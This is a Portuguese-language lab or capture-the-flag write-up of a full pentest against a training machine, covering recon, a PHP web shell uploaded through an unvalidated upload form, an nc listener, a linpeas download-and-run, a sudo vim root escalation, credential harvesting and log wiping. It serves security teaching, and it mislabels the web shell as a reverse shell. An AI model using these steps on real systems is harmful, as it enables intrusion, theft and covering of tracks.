✅ Putting It All Together - Full Report

Objetivo:
Integrar conhecimentos adquiridos nas salas anteriores (DNS, HTTP, Enumeração, Linux, PrivEsc, etc.) para simular um pentest completo contra uma máquina-alvo. O foco é aplicar técnicas reais de reconhecimento, exploração e pós-exploração.


🔧 Ferramentas Utilizadas:

nmap – Enumeração de portas e serviços
gobuster – Força bruta de diretórios
nikto – Scanner de vulnerabilidades web
hydra – Ataques de força bruta
linpeas / lse – Enumeração de privilégios
netcat / socat – Reverse Shells
Burp Suite – Interceptação e manipulação de requisições
John / hashcat – Quebra de senhas


🔍 1. Reconhecimento com Nmap
nmap -sC -sV -oA scan 10.10.X.X

Resultado:
Porta 80: Serviço HTTP rodando com Apache
Porta 22: SSH habilitado

🧠 Análise: Serviço web ativo e possível ponto de entrada via login.


🌐 2. Enumeração Web

gobuster dir -u http://10.10.X.X -w /usr/share/wordlists/dirb/common.txt

Resultado:
/login
/admin
/uploads

💡 Descoberta de diretórios administrativos e de upload — superficialmente ocultos, mas acessíveis.


🧪 3. Exploração
Identificado campo de upload sem validação adequada

Envio de arquivo .php com shell reverso:

<?php system($_GET['cmd']); ?>

Acesso remoto via:
nc -lvnp 4444

⚠️ Shell obtido com privilégio de usuário comum.


🧱 4. Escalada de Privilégio
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

🔍 Descoberta:
Arquivo sudoers permite execução de vim como root sem senha.

Exploração:
sudo vim -c '!sh'

✅ Root access obtido!


🔑 5. Pós-Exploração

Acesso ao root.txt
Extração de credenciais armazenadas em .bash_history e arquivos de configuração
Limpeza de rastros no .bash_history, wtmp, auth.log (opcional)


🧠 Lições Aprendidas:
Combinação de ferramentas e metodologia leva a comprometimento total do sistema
Verificação de upload de arquivos é crucial em segurança web
Pequenos detalhes como permissões de sudo mal configuradas podem permitir root
A análise pós-exploração é importante para entender o que mais poderia ser comprometido

